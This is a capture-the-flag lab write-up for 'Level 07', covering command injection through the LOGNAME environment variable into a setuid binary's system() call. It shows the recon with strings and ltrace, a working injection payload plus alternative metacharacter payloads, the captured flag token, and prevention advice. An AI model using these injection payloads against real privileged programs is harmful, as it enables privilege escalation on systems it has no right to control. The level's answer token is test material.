# Level 07 - Environment Variable Injection

## Objective
Exploit environment variable usage in a setuid binary to execute commands as `flag07`.

## My Notes

Found a setuid binary:
```bash
ls -la
# -rwsr-sr-x 1 flag07 level07 8805 level07
```

Ran it - just prints "level07". Used `strings` to see what it references:
```bash
strings level07
# LOGNAME
# /bin/echo %s
```

Looks like it uses the `LOGNAME` environment variable and has `/bin/echo %s` format string. Probably calls `system()`.

Traced library calls with ltrace:
```bash
ltrace ./level07
```

```
getenv("LOGNAME")                        = "level07"
asprintf(&buffer, "/bin/echo %s", "level07")
system("/bin/echo level07")              = 0
```

So it reads `LOGNAME`, constructs `/bin/echo $LOGNAME`, and passes it to `system()`. Since environment variables are user-controlled, I can inject shell metacharacters.

```bash
LOGNAME='$(getflag)' ./level07
# Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

The `$()` gets expanded by the shell running inside `system()`, so getflag executes.

Token: `fiumuikeil55xe9cu4dood66h`

## Key Takeaways

**Environment variables:** Name-value pairs available to processes. User-controlled, so programs shouldn't trust them in privileged contexts.

**system() function:** Passes command to `/bin/sh -c`, so all shell features work including command substitution, pipes, redirects. Never put untrusted data in system() calls.

**Shell command substitution:** `$(command)` or `` `command` `` execute the command and substitute output. Useful for injection.

**Attack visualization:** LOGNAME="$(getflag)" → system("/bin/echo $(getflag)") → shell expands → getflag runs.

**Other payloads that would work:** `;getflag`, `||getflag`, `` `getflag` ``, etc.

## Tools Used
- `strings` - Find readable text in binary
- `ltrace` - Trace library calls
- `export` - Set environment variables

## Prevention
- Never trust environment variables in privileged programs
- Sanitize or clear environment (unsetenv, clearenv)
- Avoid system() - use exec() family with explicit arguments
- Input validation - whitelist allowed characters
- Drop SUID privileges before calling system()
